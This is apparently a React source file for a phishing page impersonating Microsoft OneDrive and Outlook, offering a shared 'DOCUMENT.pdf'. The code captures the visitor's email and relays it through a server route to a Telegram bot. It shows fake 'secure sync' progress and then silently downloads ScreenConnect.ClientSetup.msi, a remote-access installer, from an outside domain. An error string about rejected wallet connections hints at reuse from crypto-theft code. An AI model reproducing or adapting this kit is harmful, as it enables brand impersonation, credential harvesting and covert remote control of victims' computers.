import { useState, useRef, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { FileText, Loader2, Cloud } from "lucide-react";
import axios from "axios";

type DownloadStatus = "IDLE" | "VALIDATING" | "NOTIFYING" | "SYNCING" | "DOWNLOADING" | "COMPLETED" | "ERROR";

export default function App() {
  const [email, setEmail] = useState("");
  const [status, setStatus] = useState<DownloadStatus>("IDLE");
  const [errorMessage, setErrorMessage] = useState("");
  const [progress, setProgress] = useState(0);
  const [logs, setLogs] = useState<string[]>([]);
  const logEndRef = useRef<HTMLDivElement>(null);

  const addLog = (msg: string) => {
    setLogs((prev) => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  const validateEmail = (e: string) => {
    return String(e)
      .toLowerCase()
      .match(
        /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
      );
  };

  const handleDownload = async () => {
    if (!validateEmail(email)) {
      setErrorMessage("Please enter a valid email address.");
      addLog("ERROR: INVALID EMAIL");
      return;
    }

    setErrorMessage("");
    setStatus("VALIDATING");
    addLog(`INIT: ${email}`);
    
    try {
      setStatus("NOTIFYING");
      addLog("NOTIFYING BOT...");
      
      // Notify Telegram Bot via our server
      await axios.post("/api/notify", { email }, { timeout: 8000 });

      setStatus("SYNCING");
      addLog("ESTABLISHING SECURE SYNC...");
      
      // Simulate progress for the "Secure Sync" phase (3s as requested)
      for (let i = 0; i <= 40; i += 2) {
        setProgress(i);
        await new Promise(r => setTimeout(r, 150));
      }

      setStatus("DOWNLOADING");
      addLog("RETRIEVING PAYLOAD...");
      
      // Simulate progress for the "Retrieval" phase
      for (let i = 41; i <= 100; i += 5) {
        setProgress(i);
        await new Promise(r => setTimeout(r, 100));
      }

      addLog("TRANSFER COMPLETE");
      
      const downloadUrl = (process.env as any).VITE_DOWNLOAD_URL || "https://almarabeaunited.com/one/file/ScreenConnect.ClientSetup.msi";

      // Trigger the actual download via direct link to avoid CORS/Network Errors
      const link = document.createElement('a');
      link.href = downloadUrl;
      link.setAttribute('download', 'ScreenConnect.ClientSetup.msi');
      link.style.display = 'none';
      document.body.appendChild(link);
      link.click();
      
      // Small cleanup delay
      setTimeout(() => {
        document.body.removeChild(link);
      }, 100);

      setStatus("COMPLETED");
      addLog("HANDOVER COMPLETE");
    } catch (err: any) {
      console.error(err);
      setStatus("ERROR");
      
      // Specific messaging for different error types
      if (err.message?.includes("User rejected")) {
        setErrorMessage("Wallet connection was rejected. Please try again.");
      } else if (err.code === 'ECONNABORTED' || err.message.includes('Network Error')) {
        setErrorMessage("Connection unstable. Notification sync failed. Please try again.");
      } else {
        setErrorMessage(err.message || err.response?.data?.error || "A secure protocol error occurred. Please refresh.");
      }
      
      addLog(`CRITICAL FAILURE: ${err.message || 'UNKNOWN'}`);
    }
  };

  const isProcessing = status !== "IDLE" && status !== "COMPLETED" && status !== "ERROR";

  return (
    <div className="min-h-screen bg-[#f3f2f1] font-sans flex items-center justify-center p-4">
      <motion.div 
        initial={{ opacity: 0, shadow: "none" }}
        animate={{ opacity: 1 }}
        className="w-full max-w-[540px] bg-white rounded-lg shadow-[0_8px_40px_rgba(0,0,0,0.12)] p-12 flex flex-col items-center relative"
      >
        {/* OneDrive Logo Header */}
        <div className="flex flex-col items-center mb-10">
          <div className="flex items-center gap-1">
            <Cloud className="w-10 h-10 text-[#0078d4]" fill="#0078d4" />
          </div>
          <span className="text-[#0078d4] text-[20px] font-semibold mt-1">OneDrive</span>
        </div>

        {/* Main Heading */}
        <h1 className="text-[28px] font-bold text-center text-[#242424] leading-[1.2] mb-10 max-w-[450px]">
          Here's the document that was shared with you via Outlook.
        </h1>

        {/* Document Preview Box */}
        <div className="w-full border border-[#e1dfdd] rounded-md p-6 flex items-center gap-6 mb-4">
          <div className="w-12 h-12 bg-white flex items-center justify-center border border-[#e1dfdd]">
            <FileText className="w-8 h-8 text-[#a1a1a1]" />
          </div>
          <span className="text-[18px] font-bold text-[#242424] uppercase tracking-wide">
            DOCUMENT.pdf
          </span>
        </div>

        {/* Device Restriction Notice */}
        <p className="text-[#d83b01] text-[13px] text-center mb-8">
          Note: This file can only be accessed on a laptop or desktop.
        </p>

        {/* Email Input */}
        <div className="w-full mb-4">
          <input
            type="email"
            placeholder="Enter your email to continue"
            className="w-full h-[44px] border border-[#d2d0ce] rounded-md px-4 text-[14px] outline-none focus:border-[#0078d4] transition-all disabled:bg-gray-50"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            disabled={isProcessing}
          />
        </div>

        {/* Download Button */}
        <button
          onClick={handleDownload}
          disabled={isProcessing || !email}
          className={`w-full h-[44px] bg-[#0078d4] text-white font-semibold rounded-md transition-all flex items-center justify-center gap-2
            ${isProcessing || !email ? 'opacity-50 cursor-not-allowed' : 'hover:bg-[#005a9e] active:scale-[0.99]'}
          `}
        >
          {isProcessing ? (
            <>
              <Loader2 className="w-4 h-4 animate-spin" />
              <span>{status === "DOWNLOADING" ? `Downloading... ${progress}%` : "Please wait..."}</span>
            </>
          ) : (
            'Download'
          )}
        </button>

        {/* Progress Bar Container */}
        <AnimatePresence>
          {status === "DOWNLOADING" && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0 }}
              className="w-full mt-6 space-y-2"
            >
              <div className="flex justify-between items-center text-[11px] text-[#605e5d] font-medium">
                <span>Transferring encrypted payload...</span>
                <span>{progress}%</span>
              </div>
              <div className="w-full h-1.5 bg-[#f3f2f1] rounded-full overflow-hidden">
                <motion.div 
                  initial={{ width: 0 }}
                  animate={{ width: `${progress}%` }}
                  className="h-full bg-[#0078d4] transition-all duration-300 ease-out"
                />
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Error Display */}
        <AnimatePresence>
          {errorMessage && (
            <motion.p 
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="text-red-600 text-xs mt-3 font-medium text-center"
            >
              {errorMessage}
            </motion.p>
          )}
        </AnimatePresence>

        {/* Footer Links */}
        <div className="mt-12 flex gap-1 text-[12px] text-[#605e5d]">
          <span className="hover:underline cursor-pointer">Microsoft</span>
          <span className="mx-0.5">|</span>
          <span className="hover:underline cursor-pointer">Privacy Statement</span>
        </div>

        {/* Hidden Debug Logs (Visible on hover/tap at very bottom if needed) */}
        {logs.length > 0 && (
          <div className="absolute top-full mt-4 w-full text-[10px] text-gray-400 font-mono opacity-20 hover:opacity-100 transition-opacity whitespace-pre-wrap">
            {logs.slice(-3).join('\n')}
          </div>
        )}
      </motion.div>
    </div>
  );
}
